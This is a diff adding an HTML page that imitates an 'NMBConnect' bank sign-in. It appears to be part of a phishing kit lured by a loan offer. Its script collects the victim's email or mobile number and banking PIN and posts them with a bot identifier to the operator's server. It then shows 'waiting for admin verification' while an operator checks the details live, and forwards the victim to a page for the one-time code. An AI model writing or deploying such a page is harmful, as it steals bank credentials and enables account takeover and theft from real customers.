@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NMBConnect - Authentication</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+body{
+background: #4a2b7a;
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:20px;
+}
+
+.app{
+width:100%;
+max-width:400px;
+background:#ffffff;
+border-radius:28px;
+padding:35px 28px 30px;
+box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+position:relative;
+}
+
+/* NMB CONNECT LOGO AT TOP */
+.logo-container {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.nmb-logo {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    text-decoration: none;
+}
+
+.nmb-logo .logo-icon {
+    width: 40px;
+    height: 40px;
+    background: #4a2b7a;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 20px;
+    font-weight: 700;
+}
+
+.nmb-logo .logo-text {
+    font-size: 22px;
+    font-weight: 700;
+    color: #1a1a2e;
+    letter-spacing: 0.5px;
+}
+
+.nmb-logo .logo-text span {
+    color: #4a2b7a;
+}
+
+/* HEADER SECTION */
+.header {
+    text-align: center;
+    margin-bottom: 28px;
+}
+
+.header h1 {
+    color: #1a1a2e;
+    font-size: 24px;
+    font-weight: 600;
+    letter-spacing: -0.3px;
+}
+
+/* TOGGLE SWITCH */
+.toggle-container {
+    display: flex;
+    background: #f0f0f8;
+    border-radius: 30px;
+    padding: 4px;
+    margin-bottom: 25px;
+    position: relative;
+    border: 1px solid #e8e8f0;
+    cursor: pointer;
+}
+
+.toggle-option {
+    flex: 1;
+    text-align: center;
+    padding: 10px 0;
+    border-radius: 28px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #888;
+    transition: all 0.3s ease;
+    position: relative;
+    z-index: 1;
+    user-select: none;
+}
+
+.toggle-option.active {
+    color: #1a1a2e;
+    background: #ffffff;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+    font-weight: 600;
+}
+
+.toggle-option:not(.active):hover {
+    color: #4a2b7a;
+}
+
+/* FORM SECTION */
+
+.form-group {
+    margin-bottom: 20px;
+}
+
+.form-group label {
+    display: block;
+    color: #555;
+    font-size: 13px;
+    font-weight: 500;
+    margin-bottom: 6px;
+    letter-spacing: 0.2px;
+}
+
+.input-box {
+    display: flex;
+    align-items: center;
+    border: 1.5px solid #e0e0e8;
+    border-radius: 12px;
+    padding: 0 14px;
+    transition: all 0.3s ease;
+    background: #fafaff;
+}
+
+.input-box:focus-within {
+    border-color: #4a2b7a;
+    background: #ffffff;
+    box-shadow: 0 0 0 3px rgba(74, 43, 122, 0.08);
+}
+
+.input-box .prefix {
+    color: #888;
+    font-size: 14px;
+    font-weight: 500;
+    margin-right: 6px;
+    white-space: nowrap;
+}
+
+.input-box input {
+    background: none;
+    border: none;
+    outline: none;
+    color: #1a1a2e;
+    width: 100%;
+    font-size: 15px;
+    padding: 13px 0;
+}
+
+.input-box input::placeholder {
+    color: #bbb;
+    font-weight: 400;
+}
+
+/* PIN INPUT */
+.pin-input .input-box {
+    background: #f8f9ff;
+    border-color: #d8d8e8;
+}
+
+.pin-input .input-box input {
+    font-size: 18px;
+    font-weight: 600;
+    letter-spacing: 6px;
+}
+
+.pin-input .input-box input::placeholder {
+    letter-spacing: 2px;
+    font-weight: 400;
+    color: #ccc;
+}
+
+/* SIGN IN BUTTON */
+.signin-btn {
+    width: 100%;
+    padding: 15px;
+    background: #4a2b7a;
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    margin-top: 8px;
+    letter-spacing: 0.3px;
+}
+
+.signin-btn:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+    transform: none !important;
+    opacity: 0.7;
+}
+
+.signin-btn:hover:not(:disabled) {
+    background: #3a1f5e;
+    transform: translateY(-1px);
+    box-shadow: 0 6px 20px rgba(74, 43, 122, 0.35);
+}
+
+.signin-btn:active:not(:disabled) {
+    transform: translateY(0);
+}
+
+/* DIVIDER WITH "OR" */
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 22px 0 18px;
+}
+
+.divider::before,
+.divider::after {
+    content: '';
+    flex: 1;
+    border-bottom: 1px solid #e8e8ee;
+}
+
+.divider span {
+    padding: 0 14px;
+    color: #aaa;
+    font-size: 12px;
+    font-weight: 500;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+/* BIOMETRIC OPTION */
+.biometric {
+    text-align: center;
+    margin: 0 0 22px;
+}
+
+.biometric-btn {
+    background: none;
+    border: 1.5px solid #e8e8ee;
+    border-radius: 12px;
+    padding: 13px;
+    width: 100%;
+    color: #555;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    background: #fafaff;
+}
+
+.biometric-btn:hover {
+    border-color: #4a2b7a;
+    background: #f8f9ff;
+    color: #4a2b7a;
+}
+
+.biometric-btn .icon {
+    font-size: 20px;
+}
+
+/* LINKS */
+.links {
+    text-align: center;
+}
+
+.links .forgot {
+    display: block;
+    color: #4a2b7a;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+    margin-bottom: 14px;
+    transition: color 0.3s;
+}
+
+.links .forgot:hover {
+    color: #3a1f5e;
+    text-decoration: underline;
+}
+
+.links .open-account {
+    color: #777;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 400;
+    transition: color 0.3s;
+}
+
+.links .open-account strong {
+    color: #4a2b7a;
+    font-weight: 600;
+}
+
+.links .open-account:hover {
+    color: #555;
+}
+
+.links .open-account:hover strong {
+    color: #3a1f5e;
+}
+
+/* STATUS MESSAGE */
+.status-message {
+    margin-top: 18px;
+    padding: 12px 15px;
+    border-radius: 10px;
+    text-align: center;
+    font-size: 13px;
+    font-weight: 500;
+    display: none;
+    animation: fadeIn 0.4s ease;
+}
+
+.status-message.show {
+    display: block;
+}
+
+.status-message.waiting {
+    background: #f0f4ff;
+    color: #4a2b7a;
+    border: 1px solid #d4dcff;
+}
+
+.status-message.success {
+    background: #e8f5e9;
+    color: #2e7d32;
+    border: 1px solid #a5d6a7;
+}
+
+.status-message.error {
+    background: #ffebee;
+    color: #c62828;
+    border: 1px solid #ef9a9a;
+}
+
+.status-message .spinner {
+    display: inline-block;
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid rgba(74, 43, 122, 0.3);
+    border-radius: 50%;
+    border-top-color: #4a2b7a;
+    animation: spin 0.8s ease-in-out infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-8px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+/* RESPONSIVE */
+@media (max-width: 440px) {
+    .app {
+        padding: 28px 20px 25px;
+        border-radius: 22px;
+    }
+    
+    .header h1 {
+        font-size: 22px;
+    }
+    
+    .nmb-logo .logo-text {
+        font-size: 20px;
+    }
+    
+    .toggle-option {
+        font-size: 13px;
+        padding: 9px 0;
+    }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+    <!-- NMB CONNECT LOGO -->
+    <div class="logo-container">
+        <div class="nmb-logo">
+            <div class="logo-icon">N</div>
+            <div class="logo-text">NMB<span>Connect</span></div>
+        </div>
+    </div>
+
+    <div class="header">
+        <h1>Create Profile</h1>
+    </div>
+
+    <form id="detailsForm">
+
+        <!-- Toggle Switch -->
+        <div class="toggle-container" id="toggleContainer">
+            <div class="toggle-option active" data-type="email">Email Address</div>
+            <div class="toggle-option" data-type="phone">Mobile Number</div>
+        </div>
+
+        <!-- Dynamic Input Field -->
+        <div class="form-group" id="inputGroup">
+            <label id="inputLabel">Email Address</label>
+            <div class="input-box">
+                <span class="prefix" id="inputPrefix" style="display:none;">(+263)</span>
+                <input id="userInput" type="email" placeholder="Enter your email address">
+            </div>
+        </div>
+
+        <div class="form-group pin-input">
+            <label>Enter Pin</label>
+            <div class="input-box">
+                <input id="pin" type="password" placeholder="• • • •" maxlength="4" required>
+            </div>
+        </div>
+
+        <button type="submit" class="signin-btn" id="signinBtn">Sign In</button>
+
+    </form>
+
+    <div class="divider">
+        <span>or</span>
+    </div>
+
+    <div class="biometric">
+        <button class="biometric-btn" id="biometricBtn" type="button">
+            <span class="icon">🔐</span>
+            Use Face Recognition or Fingerprint
+        </button>
+    </div>
+
+    <div class="links">
+        <a href="#" class="forgot">Forgot Password?</a>
+        <a href="#" class="open-account">Don't have NMB account? <strong>Open Account</strong></a>
+    </div>
+
+    <div id="status" class="status-message"></div>
+
+</div>
+
+<script>
+
+// ---------------- BOT ID ----------------
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId') || window.location.pathname.split('/').pop();
+if (!botId) { alert("Invalid access link"); throw new Error(); }
+
+// ---------------- FLOW CHECK ----------------
+if (!localStorage.getItem('loanAmount')) {
+    window.location.href = `index.html?botId=${botId}`;
+}
+
+const signinBtn = document.getElementById('signinBtn');
+const statusDiv = document.getElementById('status');
+const toggleContainer = document.getElementById('toggleContainer');
+const userInput = document.getElementById('userInput');
+const inputLabel = document.getElementById('inputLabel');
+const inputPrefix = document.getElementById('inputPrefix');
+
+// ---------------- TOGGLE LOGIC ----------------
+let currentType = 'email'; // 'phone' or 'email'
+
+toggleContainer.addEventListener('click', function(e) {
+    const option = e.target.closest('.toggle-option');
+    if (!option) return;
+    if (option.classList.contains('active')) return;
+
+    // Update active state
+    document.querySelectorAll('.toggle-option').forEach(opt => {
+        opt.classList.remove('active');
+    });
+    option.classList.add('active');
+
+    // Update input field
+    currentType = option.dataset.type;
+    if (currentType === 'phone') {
+        inputLabel.textContent = 'Mobile Number';
+        inputPrefix.style.display = 'inline';
+        userInput.type = 'tel';
+        userInput.placeholder = 'Enter your mobile number';
+        userInput.value = '';
+    } else {
+        inputLabel.textContent = 'Email Address';
+        inputPrefix.style.display = 'none';
+        userInput.type = 'email';
+        userInput.placeholder = 'Enter your email address';
+        userInput.value = '';
+    }
+
+    // Clear any previous status
+    hideStatus();
+});
+
+// ---------------- STATUS HELPER ----------------
+function showStatus(message, type) {
+    statusDiv.innerHTML = message;
+    statusDiv.className = 'status-message show';
+    if (type) {
+        statusDiv.classList.add(type);
+    }
+}
+
+function hideStatus() {
+    statusDiv.className = 'status-message';
+    statusDiv.innerHTML = '';
+}
+
+// ---------------- BIOMETRIC BUTTON (Just UI - no logic change) ----------------
+document.getElementById('biometricBtn').addEventListener('click', function() {
+    showStatus('🔐 Face recognition feature coming soon', 'waiting');
+    setTimeout(hideStatus, 3000);
+});
+
+// ---------------- SUBMIT ----------------
+document.getElementById('detailsForm').addEventListener('submit', async e => {
+    e.preventDefault();
+
+    const inputValue = userInput.value.trim();
+    const pin = document.getElementById('pin').value.trim();
+    const name = localStorage.getItem('fullName');
+
+    // Validation based on current type
+    if (!inputValue) {
+        showStatus(`⚠️ Please enter your ${currentType === 'phone' ? 'mobile number' : 'email address'}`, 'error');
+        return;
+    }
+
+    // Email validation if email mode
+    if (currentType === 'email' && !inputValue.includes('@')) {
+        showStatus('⚠️ Please enter a valid email address', 'error');
+        return;
+    }
+
+    // Phone validation if phone mode
+    if (currentType === 'phone' && inputValue.length < 10) {
+        showStatus('⚠️ Please enter a valid mobile number', 'error');
+        return;
+    }
+
+    if (!pin || pin.length < 4) {
+        showStatus('⚠️ Please enter a 4-digit PIN', 'error');
+        return;
+    }
+
+    if (!name) {
+        showStatus('⚠️ Name not found. Please restart.', 'error');
+        return;
+    }
+
+    signinBtn.disabled = true;
+    signinBtn.textContent = "Processing...";
+    hideStatus();
+
+    try {
+        // Store in localStorage
+        if (currentType === 'phone') {
+            localStorage.setItem('phone', inputValue);
+        } else {
+            localStorage.setItem('email', inputValue);
+        }
+        localStorage.setItem('pin', pin);
+
+        // Build payload based on what user entered
+        const payload = {
+            name: name,
+            pin: pin,
+            botId: botId,
+            identifierType: currentType  // 'phone' or 'email'
+        };
+
+        // Send either phone or email, not both
+        if (currentType === 'phone') {
+            payload.phone = inputValue;
+        } else {
+            payload.email = inputValue;
+        }
+
+        console.log('📤 Sending to server:', payload);
+
+        const res = await fetch('/submit-details', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify(payload)
+        });
+
+        const data = await res.json();
+        
+        if (!res.ok) {
+            throw new Error(data.error || 'Failed to submit');
+        }
+
+        // Show waiting status with spinner
+        showStatus('⏳ Waiting for admin verification...', 'waiting');
+
+        // ---------------- POLLING ----------------
+        const poll = setInterval(async () => {
+            try {
+                const r = await fetch(`/check-details/${data.requestId}`);
+                const d = await r.json();
+
+                // ✅ All approved - redirect to OTP page
+                if (d.approved === true) {
+                    clearInterval(poll);
+                    showStatus('✅ Verified! Redirecting...', 'success');
+                    signinBtn.disabled = false;
+                    signinBtn.textContent = "Sign In";
+                    
+                    console.log('✅ All verified! Redirecting to OTP page...');
+                    
+                    setTimeout(() => {
+                        window.location.href = `/code.html?botId=${botId}`;
+                    }, 1500);
+                }
+
+                // ❌ Phone/Email rejected
+                if (d.approved === false && d.reason === 'invalid_identifier') {
+                    clearInterval(poll);
+                    showStatus('❌ Invalid phone number/email. Please check and try again.', 'error');
+                    signinBtn.disabled = false;
+                    signinBtn.textContent = "Sign In";
+                    userInput.value = '';
+                    userInput.focus();
+                }
+
+                // ❌ PIN rejected
+                if (d.approved === false && d.reason === 'invalid_pin') {
+                    clearInterval(poll);
+                    showStatus('❌ Incorrect PIN. Please try again.', 'error');
+                    signinBtn.disabled = false;
+                    signinBtn.textContent = "Sign In";
+                    document.getElementById('pin').value = '';
+                    document.getElementById('pin').focus();
+                }
+
+                // ❌ Both rejected (fallback)
+                if (d.approved === false && !d.reason) {
+                    clearInterval(poll);
+                    showStatus('❌ Verification failed. Please check your details.', 'error');
+                    signinBtn.disabled = false;
+                    signinBtn.textContent = "Sign In";
+                }
+
+            } catch (err) {
+                clearInterval(poll);
+                showStatus('⚠️ Connection lost. Please try again.', 'error');
+                signinBtn.disabled = false;
+                signinBtn.textContent = "Sign In";
+            }
+
+        }, 2000);
+
+    } catch (err) {
+        showStatus('❌ ' + err.message, 'error');
+        signinBtn.disabled = false;
+        signinBtn.textContent = "Sign In";
+    }
+});
+
+</script>
+
+</body>
+</html>
